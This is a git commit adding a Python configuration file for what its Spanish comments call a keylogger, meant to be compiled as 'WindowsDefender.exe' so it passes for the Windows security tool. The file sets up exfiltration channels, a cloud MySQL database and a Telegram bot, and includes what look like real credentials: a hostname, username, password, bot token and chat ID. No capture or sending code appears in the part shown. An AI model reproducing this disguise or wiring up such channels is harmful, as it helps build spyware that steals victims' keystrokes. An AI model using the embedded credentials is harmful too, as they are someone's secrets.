d17b31349f858082c2c4e4bc21962a1efaf0039c
SebastianEPH <sebastianeph99@gmail.com>
2020-06-30 17:17:10 -0500

    agregando soporte para objetos

---
+++ ejecutar.py
@@ -0,0 +1,58 @@
+
+
+class Functionsaaa:    #Clase
+    def __init__(self, age): # Método o función
+        self.edad = age;
+        print("Soy un nuevo método")
+    def caminar(self, hola):
+        print("Proceso Trojan"+ str(hola))
+
+
+
+class Config:
+    def __init__(self,host="soy el host"):
+        self.nameKey = "WindowsDefender.exe"   # Nombre del Keylogger // Debe ser exactamente igual al Compilado *.exe
+        self.other = ""
+        self.sdf = host
+    class DataBase:  # Clase de Base de datos
+        def __init__(self):
+            self.HOSTNAME = "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"  # HostName
+            self.USERNAME = "udwlsyrbtldkznqo"                                      # Username
+            self.PASSWORD = "OR2i2dfdgWek0UDiAv4f"                                  # Password
+            self.DB_NAME  = "bh1g5gnxzw2igrvui8hq"                                  # DataBase Name
+            self.PORT     = "3306"                                                  # Port
+    class Gmail:
+        def __init__(self):
+            self.EMAIL_1 = ""
+            self.EMAIL_2 = ""
+    class Telegram:
+        def __init__(self):
+            self.ID   = 831756903                                                     # ID Principal [Obligatorio]
+            self.ID_2 = 000000000                                                     # ID secundario [Opcional]
+            self.ID_3 = 000000000                                                     # ID Terciario  [Opcional]
+            self.TOKEN = "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"
+
+
+
+
+
+
+
+
+
+
+
+
+class Util:
+    def __init__(self): #Constructor?
+        pass
+
+
+##print(str());
+
+
+
+
+
+
+
